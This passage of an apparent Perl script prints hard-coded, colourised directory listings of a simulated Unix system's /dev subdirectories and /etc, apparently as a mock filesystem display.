brw-rw-rw-   1 root     floppy     2,  50 May 14  1996$amarelo fd2h410$normal
brw-rw-rw-   1 root     floppy     2,  66 May 14  1996$amarelo fd2h420$normal
brw-rw-rw-   1 root     floppy     2,  26 May 14  1996$amarelo fd2h720$normal
brw-rw-rw-   1 root     floppy     2,  82 May 14  1996$amarelo fd2h880$normal
brw-rw-rw-   1 root     floppy     2,  86 May 14  1996$amarelo fd2u1040$normal
brw-rw-rw-   1 root     floppy     2,  90 May 14  1996$amarelo fd2u1120$normal
brw-rw-rw-   1 root     floppy     2,  30 May 14  1996$amarelo fd2u1440$normal
brw-rw-rw-   1 root     floppy     2, 126 May 14  1996$amarelo fd2u1600$normal
brw-rw-rw-   1 root     floppy     2,  46 May 14  1996$amarelo fd2u1680$normal
brw-rw-rw-   1 root     floppy     2,  62 May 14  1996$amarelo fd2u1722$normal
brw-rw-rw-   1 root     floppy     2,  78 May 14  1996$amarelo fd2u1743$normal
brw-rw-rw-   1 root     floppy     2,  98 May 14  1996$amarelo fd2u1760$normal
brw-rw-rw-   1 root     floppy     2, 118 May 14  1996$amarelo fd2u1840$normal
brw-rw-rw-   1 root     floppy     2, 102 May 14  1996$amarelo fd2u1920$normal
brw-rw-rw-   1 root     floppy     2,  34 May 14  1996$amarelo fd2u2880$normal
brw-rw-rw-   1 root     floppy     2, 106 May 14  1996$amarelo fd2u3200$normal
brw-rw-rw-   1 root     floppy     2, 110 May 14  1996$amarelo fd2u3520$normal
brw-rw-rw-   1 root     floppy     2,  14 May 14  1996$amarelo fd2u360$normal
brw-rw-rw-   1 root     floppy     2, 114 May 14  1996$amarelo fd2u3840$normal
brw-rw-rw-   1 root     floppy     2,  18 May 14  1996$amarelo fd2u720$normal
brw-rw-rw-   1 root     floppy     2, 122 May 14  1996$amarelo fd2u800$normal
brw-rw-rw-   1 root     floppy     2,  54 May 14  1996$amarelo fd2u820$normal
brw-rw-rw-   1 root     floppy     2,  70 May 14  1996$amarelo fd2u830$normal
brw-rw-rw-   1 root     floppy     2,   3 May 14  1996$amarelo fd3$normal
brw-rw-rw-   1 root     floppy     2,  39 May 14  1996$amarelo fd3CompaQ$normal
brw-rw-rw-   1 root     floppy     2,   7 May 14  1996$amarelo fd3d360$normal
brw-rw-rw-   1 root     floppy     2,  11 May 14  1996$amarelo fd3h1200$normal
brw-rw-rw-   1 root     floppy     2,  43 May 14  1996$amarelo fd3h1440$normal
brw-rw-rw-   1 root     floppy     2,  59 May 14  1996$amarelo fd3h1476$normal
brw-rw-rw-   1 root     floppy     2,  75 May 14  1996$amarelo fd3h1494$normal
brw-rw-rw-   1 root     floppy     2,  95 May 14  1996$amarelo fd3h1600$normal
brw-rw-rw-   1 root     floppy     2,  23 May 14  1996$amarelo fd3h360$normal
brw-rw-rw-   1 root     floppy     2,  51 May 14  1996$amarelo fd3h410$normal
brw-rw-rw-   1 root     floppy     2,  67 May 14  1996$amarelo fd3h420$normal
brw-rw-rw-   1 root     floppy     2,  27 May 14  1996$amarelo fd3h720$normal
brw-rw-rw-   1 root     floppy     2,  83 May 14  1996$amarelo fd3h880$normal
brw-rw-rw-   1 root     floppy     2,  87 May 14  1996$amarelo fd3u1040$normal
brw-rw-rw-   1 root     floppy     2,  91 May 14  1996$amarelo fd3u1120$normal
brw-rw-rw-   1 root     floppy     2,  31 May 14  1996$amarelo fd3u1440$normal
brw-rw-rw-   1 root     floppy     2, 127 May 14  1996$amarelo fd3u1600$normal
brw-rw-rw-   1 root     floppy     2,  47 May 14  1996$amarelo fd3u1680$normal
brw-rw-rw-   1 root     floppy     2,  63 May 14  1996$amarelo fd3u1722$normal
brw-rw-rw-   1 root     floppy     2,  79 May 14  1996$amarelo fd3u1743$normal
brw-rw-rw-   1 root     floppy     2,  99 May 14  1996$amarelo fd3u1760$normal
brw-rw-rw-   1 root     floppy     2, 119 May 14  1996$amarelo fd3u1840$normal
brw-rw-rw-   1 root     floppy     2, 103 May 14  1996$amarelo fd3u1920$normal
brw-rw-rw-   1 root     floppy     2,  35 May 14  1996$amarelo fd3u2880$normal
brw-rw-rw-   1 root     floppy     2, 107 May 14  1996$amarelo fd3u3200$normal
brw-rw-rw-   1 root     floppy     2, 111 May 14  1996$amarelo fd3u3520$normal
brw-rw-rw-   1 root     floppy     2,  15 May 14  1996$amarelo fd3u360$normal
brw-rw-rw-   1 root     floppy     2, 115 May 14  1996$amarelo fd3u3840$normal
brw-rw-rw-   1 root     floppy     2,  19 May 14  1996$amarelo fd3u720$normal
brw-rw-rw-   1 root     floppy     2, 123 May 14  1996$amarelo fd3u800$normal
brw-rw-rw-   1 root     floppy     2,  55 May 14  1996$amarelo fd3u820$normal
brw-rw-rw-   1 root     floppy     2,  71 May 14  1996$amarelo fd3u830$normal
crw-rw-rw-   1 root     sys        1,   7 Jul 17  1994$amarelo full$normal
EOT
}

sub list_4
{
   # /dev/inet
   print STDERR << "EOT"
drwxr-xrwx   2 root     root         4096 Aug 13  1995$azul_claro .$normal
drwxr-xr-x   5 root     root        28672 Jan 29 19:52$azul_claro ..$normal
crw-rw-rw-   1 root     root      30,  37 Aug 13  1995$amarelo egp$normal
crw-rw-rw-   1 root     root      30,  34 Aug 13  1995$amarelo ggp$normal
crw-rw-rw-   1 root     root      30,  33 Aug 13  1995$amarelo icmp$normal
crw-rw-rw-   1 root     root      30,  40 Aug 13  1995$amarelo idp$normal
crw-rw-rw-   1 root     root      30,  32 Aug 13  1995$amarelo ip$normal
crw-rw-rw-   1 root     root      30,  35 Aug 13  1995$amarelo ipip$normal
crw-rw-rw-   1 root     root      30,  38 Aug 13  1995$amarelo pup$normal
crw-rw-rw-   1 root     root      30,  41 Aug 13  1995$amarelo rawip$normal
crw-rw-rw-   1 root     root      30,  36 Aug 13  1995$amarelo tcp$normal
crw-rw-rw-   1 root     root      30,  39 Aug 13  1995$amarelo udp$normal
EOT
}

sub list_5
{
   # /dev/pts
   print STDERR << "EOT"
drwxr-xr-x   2 root     root            0 Jan 29 17:52$azul_claro .$normal
drwxr-xr-x   5 root     root        28672 Jan 29 19:52$azul_claro ..$normal
crw----rw-   1 lorena   users      5,   0 Aug  5 07:33$amarelo 0$normal
crw----rw-   1 joao     users      5,   1 Aug  5 07:33$amarelo 1$normal
EOT
}

sub list_6
{
   # /dev/rd
   print STDERR << "EOT"
drwxr-xrwx   2 root     root        32768 Aug 22  1999$azul_claro .$normal
drwxr-xr-x   5 root     root        28672 Jan 29 19:52$azul_claro ..$normal
brw-------   1 root     root      48,   0 Aug 22  1999 c0d0$normal
brw-------   1 root     root      48,   1 Aug 22  1999 c0d0p1$normal
brw-------   1 root     root      48,   2 Aug 22  1999 c0d0p2$normal
brw-------   1 root     root      48,   3 Aug 22  1999 c0d0p3$normal
brw-------   1 root     root      48,   4 Aug 22  1999 c0d0p4$normal
brw-------   1 root     root      48,   5 Aug 22  1999 c0d0p5$normal
brw-------   1 root     root      48,   6 Aug 22  1999 c0d0p6$normal
brw-------   1 root     root      48,   7 Aug 22  1999 c0d0p7$normal
brw-------   1 root     root      48,   8 Aug 22  1999 c0d1$normal
brw-------   1 root     root      48,  80 Aug 22  1999 c0d10$normal
brw-------   1 root     root      48,  81 Aug 22  1999 c0d10p1$normal
brw-------   1 root     root      48,  82 Aug 22  1999 c0d10p2$normal
brw-------   1 root     root      48,  83 Aug 22  1999 c0d10p3$normal
brw-------   1 root     root      48,  84 Aug 22  1999 c0d10p4$normal
brw-------   1 root     root      48,  85 Aug 22  1999 c0d10p5$normal
brw-------   1 root     root      48,  86 Aug 22  1999 c0d10p6$normal
brw-------   1 root     root      48,  87 Aug 22  1999 c0d10p7$normal
brw-------   1 root     root      48,  88 Aug 22  1999 c0d11$normal
brw-------   1 root     root      48,  89 Aug 22  1999 c0d11p1$normal
brw-------   1 root     root      48,  90 Aug 22  1999 c0d11p2$normal
brw-------   1 root     root      48,  91 Aug 22  1999 c0d11p3$normal
brw-------   1 root     root      48,  92 Aug 22  1999 c0d11p4$normal
brw-------   1 root     root      48,  93 Aug 22  1999 c0d11p5$normal
brw-------   1 root     root      48,  94 Aug 22  1999 c0d11p6$normal
brw-------   1 root     root      48,  95 Aug 22  1999 c0d11p7$normal
brw-------   1 root     root      48,  96 Aug 22  1999 c0d12$normal
brw-------   1 root     root      48,  97 Aug 22  1999 c0d12p1$normal
brw-------   1 root     root      48,  98 Aug 22  1999 c0d12p2$normal
brw-------   1 root     root      48,  99 Aug 22  1999 c0d12p3$normal
brw-------   1 root     root      48, 100 Aug 22  1999 c0d12p4$normal
brw-------   1 root     root      48, 101 Aug 22  1999 c0d12p5$normal
brw-------   1 root     root      48, 102 Aug 22  1999 c0d12p6$normal
brw-------   1 root     root      48, 103 Aug 22  1999 c0d12p7$normal
brw-------   1 root     root      48, 104 Aug 22  1999 c0d13$normal
brw-------   1 root     root      48, 105 Aug 22  1999 c0d13p1$normal
brw-------   1 root     root      48, 106 Aug 22  1999 c0d13p2$normal
brw-------   1 root     root      48, 107 Aug 22  1999 c0d13p3$normal
brw-------   1 root     root      48, 108 Aug 22  1999 c0d13p4$normal
brw-------   1 root     root      48, 109 Aug 22  1999 c0d13p5$normal
brw-------   1 root     root      48, 110 Aug 22  1999 c0d13p6$normal
brw-------   1 root     root      48, 111 Aug 22  1999 c0d13p7$normal
brw-------   1 root     root      48, 112 Aug 22  1999 c0d14$normal
brw-------   1 root     root      48, 113 Aug 22  1999 c0d14p1$normal
brw-------   1 root     root      48, 114 Aug 22  1999 c0d14p2$normal
brw-------   1 root     root      48, 115 Aug 22  1999 c0d14p3$normal
brw-------   1 root     root      48, 116 Aug 22  1999 c0d14p4$normal
brw-------   1 root     root      48, 117 Aug 22  1999 c0d14p5$normal
brw-------   1 root     root      48, 118 Aug 22  1999 c0d14p6$normal
brw-------   1 root     root      48, 119 Aug 22  1999 c0d14p7$normal
brw-------   1 root     root      48, 120 Aug 22  1999 c0d15$normal
brw-------   1 root     root      48, 121 Aug 22  1999 c0d15p1$normal
brw-------   1 root     root      48, 122 Aug 22  1999 c0d15p2$normal
brw-------   1 root     root      48, 123 Aug 22  1999 c0d15p3$normal
brw-------   1 root     root      48, 124 Aug 22  1999 c0d15p4$normal
brw-------   1 root     root      48, 125 Aug 22  1999 c0d15p5$normal
brw-------   1 root     root      48, 126 Aug 22  1999 c0d15p6$normal
brw-------   1 root     root      48, 127 Aug 22  1999 c0d15p7$normal
brw-------   1 root     root      48, 128 Aug 22  1999 c0d16$normal
brw-------   1 root     root      48, 129 Aug 22  1999 c0d16p1$normal
brw-------   1 root     root      48, 130 Aug 22  1999 c0d16p2$normal
brw-------   1 root     root      48, 131 Aug 22  1999 c0d16p3$normal
brw-------   1 root     root      48, 132 Aug 22  1999 c0d16p4$normal
brw-------   1 root     root      48, 133 Aug 22  1999 c0d16p5$normal
brw-------   1 root     root      48, 134 Aug 22  1999 c0d16p6$normal
brw-------   1 root     root      48, 135 Aug 22  1999 c0d16p7$normal
brw-------   1 root     root      48, 136 Aug 22  1999 c0d17$normal
brw-------   1 root     root      48, 137 Aug 22  1999 c0d17p1$normal
brw-------   1 root     root      48, 138 Aug 22  1999 c0d17p2$normal
brw-------   1 root     root      48, 139 Aug 22  1999 c0d17p3$normal
brw-------   1 root     root      48, 140 Aug 22  1999 c0d17p4$normal
brw-------   1 root     root      48, 141 Aug 22  1999 c0d17p5$normal
brw-------   1 root     root      48, 142 Aug 22  1999 c0d17p6$normal
brw-------   1 root     root      48, 143 Aug 22  1999 c0d17p7$normal
brw-------   1 root     root      48, 144 Aug 22  1999 c0d18$normal
brw-------   1 root     root      48, 145 Aug 22  1999 c0d18p1$normal
brw-------   1 root     root      48, 146 Aug 22  1999 c0d18p2$normal
brw-------   1 root     root      48, 147 Aug 22  1999 c0d18p3$normal
brw-------   1 root     root      48, 148 Aug 22  1999 c0d18p4$normal
brw-------   1 root     root      48, 149 Aug 22  1999 c0d18p5$normal
brw-------   1 root     root      48, 150 Aug 22  1999 c0d18p6$normal
brw-------   1 root     root      48, 151 Aug 22  1999 c0d18p7$normal
brw-------   1 root     root      48, 152 Aug 22  1999 c0d19$normal
brw-------   1 root     root      48, 153 Aug 22  1999 c0d19p1$normal
brw-------   1 root     root      48, 154 Aug 22  1999 c0d19p2$normal
brw-------   1 root     root      48, 155 Aug 22  1999 c0d19p3$normal
brw-------   1 root     root      48, 156 Aug 22  1999 c0d19p4$normal
brw-------   1 root     root      48, 157 Aug 22  1999 c0d19p5$normal
brw-------   1 root     root      48, 158 Aug 22  1999 c0d19p6$normal
brw-------   1 root     root      48, 159 Aug 22  1999 c0d19p7$normal
brw-------   1 root     root      48,   9 Aug 22  1999 c0d1p1$normal
brw-------   1 root     root      48,  10 Aug 22  1999 c0d1p2$normal
brw-------   1 root     root      48,  11 Aug 22  1999 c0d1p3$normal
brw-------   1 root     root      48,  12 Aug 22  1999 c0d1p4$normal
brw-------   1 root     root      48,  13 Aug 22  1999 c0d1p5$normal
brw-------   1 root     root      48,  14 Aug 22  1999 c0d1p6$normal
brw-------   1 root     root      48,  15 Aug 22  1999 c0d1p7$normal
brw-------   1 root     root      48,  16 Aug 22  1999 c0d2$normal
brw-------   1 root     root      48, 160 Aug 22  1999 c0d20$normal
brw-------   1 root     root      48, 161 Aug 22  1999 c0d20p1$normal
brw-------   1 root     root      48, 162 Aug 22  1999 c0d20p2$normal
brw-------   1 root     root      48, 163 Aug 22  1999 c0d20p3$normal
brw-------   1 root     root      48, 164 Aug 22  1999 c0d20p4$normal
brw-------   1 root     root      48, 165 Aug 22  1999 c0d20p5$normal
brw-------   1 root     root      48, 166 Aug 22  1999 c0d20p6$normal
brw-------   1 root     root      48, 167 Aug 22  1999 c0d20p7$normal
brw-------   1 root     root      48, 168 Aug 22  1999 c0d21$normal
brw-------   1 root     root      48, 169 Aug 22  1999 c0d21p1$normal
brw-------   1 root     root      48, 170 Aug 22  1999 c0d21p2$normal
brw-------   1 root     root      48, 171 Aug 22  1999 c0d21p3$normal
brw-------   1 root     root      48, 172 Aug 22  1999 c0d21p4$normal
brw-------   1 root     root      48, 173 Aug 22  1999 c0d21p5$normal
brw-------   1 root     root      48, 174 Aug 22  1999 c0d21p6$normal
brw-------   1 root     root      48, 175 Aug 22  1999 c0d21p7$normal
brw-------   1 root     root      48, 176 Aug 22  1999 c0d22$normal
brw-------   1 root     root      48, 177 Aug 22  1999 c0d22p1$normal
brw-------   1 root     root      48, 178 Aug 22  1999 c0d22p2$normal
brw-------   1 root     root      48, 179 Aug 22  1999 c0d22p3$normal
brw-------   1 root     root      48, 180 Aug 22  1999 c0d22p4$normal
brw-------   1 root     root      48, 181 Aug 22  1999 c0d22p5$normal
brw-------   1 root     root      48, 182 Aug 22  1999 c0d22p6$normal
brw-------   1 root     root      48, 183 Aug 22  1999 c0d22p7$normal
brw-------   1 root     root      48, 184 Aug 22  1999 c0d23$normal
brw-------   1 root     root      48, 185 Aug 22  1999 c0d23p1$normal
brw-------   1 root     root      48, 186 Aug 22  1999 c0d23p2$normal
brw-------   1 root     root      48, 187 Aug 22  1999 c0d23p3$normal
brw-------   1 root     root      48, 188 Aug 22  1999 c0d23p4$normal
brw-------   1 root     root      48, 189 Aug 22  1999 c0d23p5$normal
brw-------   1 root     root      48, 190 Aug 22  1999 c0d23p6$normal
brw-------   1 root     root      48, 191 Aug 22  1999 c0d23p7$normal
brw-------   1 root     root      48, 192 Aug 22  1999 c0d24$normal
brw-------   1 root     root      48, 193 Aug 22  1999 c0d24p1$normal
brw-------   1 root     root      48, 194 Aug 22  1999 c0d24p2$normal
brw-------   1 root     root      48, 195 Aug 22  1999 c0d24p3$normal
brw-------   1 root     root      48, 196 Aug 22  1999 c0d24p4$normal
brw-------   1 root     root      48, 197 Aug 22  1999 c0d24p5$normal
brw-------   1 root     root      48, 198 Aug 22  1999 c0d24p6$normal
brw-------   1 root     root      48, 199 Aug 22  1999 c0d24p7$normal
brw-------   1 root     root      48, 200 Aug 22  1999 c0d25$normal
brw-------   1 root     root      48, 201 Aug 22  1999 c0d25p1$normal
brw-------   1 root     root      48, 202 Aug 22  1999 c0d25p2$normal
brw-------   1 root     root      48, 203 Aug 22  1999 c0d25p3$normal
brw-------   1 root     root      48, 204 Aug 22  1999 c0d25p4$normal
brw-------   1 root     root      48, 205 Aug 22  1999 c0d25p5$normal
brw-------   1 root     root      48, 206 Aug 22  1999 c0d25p6$normal
brw-------   1 root     root      48, 207 Aug 22  1999 c0d25p7$normal
brw-------   1 root     root      48, 208 Aug 22  1999 c0d26$normal
brw-------   1 root     root      48, 209 Aug 22  1999 c0d26p1$normal
brw-------   1 root     root      48, 210 Aug 22  1999 c0d26p2$normal
brw-------   1 root     root      48, 211 Aug 22  1999 c0d26p3$normal
brw-------   1 root     root      48, 212 Aug 22  1999 c0d26p4$normal
brw-------   1 root     root      48, 213 Aug 22  1999 c0d26p5$normal
brw-------   1 root     root      48, 214 Aug 22  1999 c0d26p6$normal
brw-------   1 root     root      48, 215 Aug 22  1999 c0d26p7$normal
brw-------   1 root     root      48, 216 Aug 22  1999 c0d27$normal
brw-------   1 root     root      48, 217 Aug 22  1999 c0d27p1$normal
brw-------   1 root     root      48, 218 Aug 22  1999 c0d27p2$normal
brw-------   1 root     root      48, 219 Aug 22  1999 c0d27p3$normal
brw-------   1 root     root      48, 220 Aug 22  1999 c0d27p4$normal
brw-------   1 root     root      48, 221 Aug 22  1999 c0d27p5$normal
brw-------   1 root     root      48, 222 Aug 22  1999 c0d27p6$normal
brw-------   1 root     root      48, 223 Aug 22  1999 c0d27p7$normal
brw-------   1 root     root      48, 224 Aug 22  1999 c0d28$normal
brw-------   1 root     root      48, 225 Aug 22  1999 c0d28p1$normal
brw-------   1 root     root      48, 226 Aug 22  1999 c0d28p2$normal
brw-------   1 root     root      48, 227 Aug 22  1999 c0d28p3$normal
brw-------   1 root     root      48, 228 Aug 22  1999 c0d28p4$normal
brw-------   1 root     root      48, 229 Aug 22  1999 c0d28p5$normal
brw-------   1 root     root      48, 230 Aug 22  1999 c0d28p6$normal
brw-------   1 root     root      48, 231 Aug 22  1999 c0d28p7$normal
brw-------   1 root     root      48, 232 Aug 22  1999 c0d29$normal
brw-------   1 root     root      48, 233 Aug 22  1999 c0d29p1$normal
brw-------   1 root     root      48, 234 Aug 22  1999 c0d29p2$normal
brw-------   1 root     root      48, 235 Aug 22  1999 c0d29p3$normal
brw-------   1 root     root      48, 236 Aug 22  1999 c0d29p4$normal
brw-------   1 root     root      48, 237 Aug 22  1999 c0d29p5$normal
brw-------   1 root     root      48, 238 Aug 22  1999 c0d29p6$normal
brw-------   1 root     root      48, 239 Aug 22  1999 c0d29p7$normal
brw-------   1 root     root      48,  17 Aug 22  1999 c0d2p1$normal
brw-------   1 root     root      48,  18 Aug 22  1999 c0d2p2$normal
brw-------   1 root     root      48,  19 Aug 22  1999 c0d2p3$normal
brw-------   1 root     root      48,  20 Aug 22  1999 c0d2p4$normal
brw-------   1 root     root      48,  21 Aug 22  1999 c0d2p5$normal
brw-------   1 root     root      48,  22 Aug 22  1999 c0d2p6$normal
brw-------   1 root     root      48,  23 Aug 22  1999 c0d2p7$normal
brw-------   1 root     root      48,  24 Aug 22  1999 c0d3$normal
brw-------   1 root     root      48, 240 Aug 22  1999 c0d30$normal
brw-------   1 root     root      48, 241 Aug 22  1999 c0d30p1$normal
brw-------   1 root     root      48, 242 Aug 22  1999 c0d30p2$normal
brw-------   1 root     root      48, 243 Aug 22  1999 c0d30p3$normal
brw-------   1 root     root      48, 244 Aug 22  1999 c0d30p4$normal
brw-------   1 root     root      48, 245 Aug 22  1999 c0d30p5$normal
brw-------   1 root     root      48, 246 Aug 22  1999 c0d30p6$normal
brw-------   1 root     root      48, 247 Aug 22  1999 c0d30p7$normal
brw-------   1 root     root      48, 248 Aug 22  1999 c0d31$normal
brw-------   1 root     root      48, 249 Aug 22  1999 c0d31p1$normal
brw-------   1 root     root      48, 250 Aug 22  1999 c0d31p2$normal
brw-------   1 root     root      48, 251 Aug 22  1999 c0d31p3$normal
brw-------   1 root     root      48, 252 Aug 22  1999 c0d31p4$normal
brw-------   1 root     root      48, 253 Aug 22  1999 c0d31p5$normal
brw-------   1 root     root      48, 254 Aug 22  1999 c0d31p6$normal
brw-------   1 root     root      48, 255 Aug 22  1999 c0d31p7$normal
brw-------   1 root     root      48,  25 Aug 22  1999 c0d3p1$normal
brw-------   1 root     root      48,  26 Aug 22  1999 c0d3p2$normal
brw-------   1 root     root      48,  27 Aug 22  1999 c0d3p3$normal
brw-------   1 root     root      48,  28 Aug 22  1999 c0d3p4$normal
brw-------   1 root     root      48,  29 Aug 22  1999 c0d3p5$normal
brw-------   1 root     root      48,  30 Aug 22  1999 c0d3p6$normal
brw-------   1 root     root      48,  31 Aug 22  1999 c0d3p7$normal
brw-------   1 root     root      48,  32 Aug 22  1999 c0d4$normal
brw-------   1 root     root      48,  33 Aug 22  1999 c0d4p1$normal
brw-------   1 root     root      48,  34 Aug 22  1999 c0d4p2$normal
brw-------   1 root     root      48,  35 Aug 22  1999 c0d4p3$normal
brw-------   1 root     root      48,  36 Aug 22  1999 c0d4p4$normal
brw-------   1 root     root      48,  37 Aug 22  1999 c0d4p5$normal
brw-------   1 root     root      48,  38 Aug 22  1999 c0d4p6$normal
brw-------   1 root     root      48,  39 Aug 22  1999 c0d4p7$normal
brw-------   1 root     root      48,  40 Aug 22  1999 c0d5$normal
brw-------   1 root     root      48,  41 Aug 22  1999 c0d5p1$normal
brw-------   1 root     root      48,  42 Aug 22  1999 c0d5p2$normal
brw-------   1 root     root      48,  43 Aug 22  1999 c0d5p3$normal
brw-------   1 root     root      48,  44 Aug 22  1999 c0d5p4$normal
brw-------   1 root     root      48,  45 Aug 22  1999 c0d5p5$normal
brw-------   1 root     root      48,  46 Aug 22  1999 c0d5p6$normal
brw-------   1 root     root      48,  47 Aug 22  1999 c0d5p7$normal
brw-------   1 root     root      48,  48 Aug 22  1999 c0d6$normal
brw-------   1 root     root      48,  49 Aug 22  1999 c0d6p1$normal
brw-------   1 root     root      48,  50 Aug 22  1999 c0d6p2$normal
brw-------   1 root     root      48,  51 Aug 22  1999 c0d6p3$normal
brw-------   1 root     root      48,  52 Aug 22  1999 c0d6p4$normal
brw-------   1 root     root      48,  53 Aug 22  1999 c0d6p5$normal
brw-------   1 root     root      48,  54 Aug 22  1999 c0d6p6$normal
brw-------   1 root     root      48,  55 Aug 22  1999 c0d6p7$normal
brw-------   1 root     root      48,  56 Aug 22  1999 c0d7$normal
brw-------   1 root     root      48,  57 Aug 22  1999 c0d7p1$normal
brw-------   1 root     root      48,  58 Aug 22  1999 c0d7p2$normal
brw-------   1 root     root      48,  59 Aug 22  1999 c0d7p3$normal
brw-------   1 root     root      48,  60 Aug 22  1999 c0d7p4$normal
brw-------   1 root     root      48,  61 Aug 22  1999 c0d7p5$normal
brw-------   1 root     root      48,  62 Aug 22  1999 c0d7p6$normal
brw-------   1 root     root      48,  63 Aug 22  1999 c0d7p7$normal
brw-------   1 root     root      48,  64 Aug 22  1999 c0d8$normal
brw-------   1 root     root      48,  65 Aug 22  1999 c0d8p1$normal
brw-------   1 root     root      48,  66 Aug 22  1999 c0d8p2$normal
brw-------   1 root     root      48,  67 Aug 22  1999 c0d8p3$normal
brw-------   1 root     root      48,  68 Aug 22  1999 c0d8p4$normal
brw-------   1 root     root      48,  69 Aug 22  1999 c0d8p5$normal
brw-------   1 root     root      48,  70 Aug 22  1999 c0d8p6$normal
brw-------   1 root     root      48,  71 Aug 22  1999 c0d8p7$normal
brw-------   1 root     root      48,  72 Aug 22  1999 c0d9$normal
brw-------   1 root     root      48,  73 Aug 22  1999 c0d9p1$normal
brw-------   1 root     root      48,  74 Aug 22  1999 c0d9p2$normal
brw-------   1 root     root      48,  75 Aug 22  1999 c0d9p3$normal
brw-------   1 root     root      48,  76 Aug 22  1999 c0d9p4$normal
brw-------   1 root     root      48,  77 Aug 22  1999 c0d9p5$normal
brw-------   1 root     root      48,  78 Aug 22  1999 c0d9p6$normal
brw-------   1 root     root      48,  79 Aug 22  1999 c0d9p7$normal
brw-------   1 root     root      49,   0 Aug 22  1999 c1d0$normal
brw-------   1 root     root      49,   1 Aug 22  1999 c1d0p1$normal
brw-------   1 root     root      49,   2 Aug 22  1999 c1d0p2$normal
brw-------   1 root     root      49,   3 Aug 22  1999 c1d0p3$normal
brw-------   1 root     root      49,   4 Aug 22  1999 c1d0p4$normal
brw-------   1 root     root      49,   5 Aug 22  1999 c1d0p5$normal
brw-------   1 root     root      49,   6 Aug 22  1999 c1d0p6$normal
brw-------   1 root     root      49,   7 Aug 22  1999 c1d0p7$normal
brw-------   1 root     root      49,   8 Aug 22  1999 c1d1$normal
brw-------   1 root     root      49,  80 Aug 22  1999 c1d10$normal
brw-------   1 root     root      49,  81 Aug 22  1999 c1d10p1$normal
brw-------   1 root     root      49,  82 Aug 22  1999 c1d10p2$normal
brw-------   1 root     root      49,  83 Aug 22  1999 c1d10p3$normal
brw-------   1 root     root      49,  84 Aug 22  1999 c1d10p4$normal
brw-------   1 root     root      49,  85 Aug 22  1999 c1d10p5$normal
brw-------   1 root     root      49,  86 Aug 22  1999 c1d10p6$normal
brw-------   1 root     root      49,  87 Aug 22  1999 c1d10p7$normal
brw-------   1 root     root      49,  88 Aug 22  1999 c1d11$normal
brw-------   1 root     root      49,  89 Aug 22  1999 c1d11p1$normal
brw-------   1 root     root      49,  90 Aug 22  1999 c1d11p2$normal
brw-------   1 root     root      49,  91 Aug 22  1999 c1d11p3$normal
brw-------   1 root     root      49,  92 Aug 22  1999 c1d11p4$normal
brw-------   1 root     root      49,  93 Aug 22  1999 c1d11p5$normal
brw-------   1 root     root      49,  94 Aug 22  1999 c1d11p6$normal
brw-------   1 root     root      49,  95 Aug 22  1999 c1d11p7$normal
brw-------   1 root     root      49,  96 Aug 22  1999 c1d12$normal
brw-------   1 root     root      49,  97 Aug 22  1999 c1d12p1$normal
brw-------   1 root     root      49,  98 Aug 22  1999 c1d12p2$normal
brw-------   1 root     root      49,  99 Aug 22  1999 c1d12p3$normal
brw-------   1 root     root      49, 100 Aug 22  1999 c1d12p4$normal
brw-------   1 root     root      49, 101 Aug 22  1999 c1d12p5$normal
brw-------   1 root     root      49, 102 Aug 22  1999 c1d12p6$normal
brw-------   1 root     root      49, 103 Aug 22  1999 c1d12p7$normal
brw-------   1 root     root      49, 104 Aug 22  1999 c1d13$normal
brw-------   1 root     root      49, 105 Aug 22  1999 c1d13p1$normal
brw-------   1 root     root      49, 106 Aug 22  1999 c1d13p2$normal
brw-------   1 root     root      49, 107 Aug 22  1999 c1d13p3$normal
brw-------   1 root     root      49, 108 Aug 22  1999 c1d13p4$normal
brw-------   1 root     root      49, 109 Aug 22  1999 c1d13p5$normal
brw-------   1 root     root      49, 110 Aug 22  1999 c1d13p6$normal
brw-------   1 root     root      49, 111 Aug 22  1999 c1d13p7$normal
brw-------   1 root     root      49, 112 Aug 22  1999 c1d14$normal
brw-------   1 root     root      49, 113 Aug 22  1999 c1d14p1$normal
EOT
}

sub list_7
{
   # /etc
   print STDERR << "EOT"
drwxr-xr-x  24 root     root         4096 Jan 29 19:52$azul_claro .$normal
drwxr-xr-x  21 root     root         4096 Jan 29 07:45$azul_claro ..$normal
-rw-r-----   1 root     root         2369 Sep 27  1999 DIR_COLORS$normal
-rw-r--r-x   1 root     root           10 Mar 29  2000$verde_claro HOSTNAME$normal
-rw-r-----   1 root     root            4 Feb 23  1993 NETWORKING$normal
-rw-r-----   1 root     root        20765 Sep  7 08:34 XF86Config$normal
-rw-r-----   1 root     root          701 Jan 11  1999 aliases$normal
-rw-r-----   1 root     root        20480 Aug 19  1999 aliases.db$normal
-rw-r-----   1 root     root          103 Mar 29  2000 conf.modules$normal
drwxr-x--x   2 root     root         4096 May 19  1994$azul_claro default$normal
drwxr-x--x   2 root     root         4096 Oct 25  1999$azul_claro dhcpc$normal
-rw-r-----   1 root     root           75 Oct 25  1999 dhcpd.conf$normal
-rw-r-----   1 root     users         706 Aug 14  1996 diphosts$normal
-rwxr-xr-x   1 root     root         9320 Apr 26  2000$verde_claro dircolors$normal
-rw-r-----   1 root     root          154 Aug 20  1994 exports$normal
-rw-r-----   1 root     root         1118 Jan 28  1994 fdprm$normal
-rw-r-----   1 root     root          418 Mar 29  2000 fstab$normal
-rw-r-----   1 root     root         1772 Dec 24 00:10 ftpaccess$normal
-rw-r-----   1 root     root          368 Jul 31  1994 ftpconversions_k$normal
-rw-r-----   1 root     root           18 Apr  7  1998 ftpgroups$normal
-rw-r-----   1 root     root          504 Apr 26  2000 ftpusers$normal
-rw-r-----   1 root     root           76 Aug 20  1994 gateways$normal
-rw-r-----   1 root     root         2362 Feb 26  1998 gettydefs$normal
-rw-r-----   1 root     root         1756 Jul 29  1999 gpm-root.conf$normal
-rw-r-----   1 root     root          966 Jul 29  1999 gpm-syn.conf$normal
-rw-r-----   1 root     root         4763 Jul 29  1999 gpm-twiddler.conf$normal
-rw-r--r--   1 root     root          332 Nov 18 18:05 group$normal
-rw-r-----   1 root     root           27 Jul  7  1994 host.conf$normal
-rw-r-----   1 root     root          749 Jul 27  2000 hosts$normal
-rw-r-----   1 root     root          293 Nov 25  1993 hosts.allow$normal
-rw-r-----   1 root     root          313 Apr 27  2000 hosts.deny$normal
-rw-r-----   1 root     root          320 Feb  8  1998 hosts.equiv$normal
-rw-r-----   1 root     root          302 Sep 23  1993 hosts.lpd$normal
drwxr-x--x   3 root     root         4096 Mar 31  2000$azul_claro httpd$normal
-rw-r-----   1 root     root         4932 Jan 27 20:00 inetd.conf$normal
-rw-r-----   1 root     root         2938 Apr 26  2000 inittab$normal
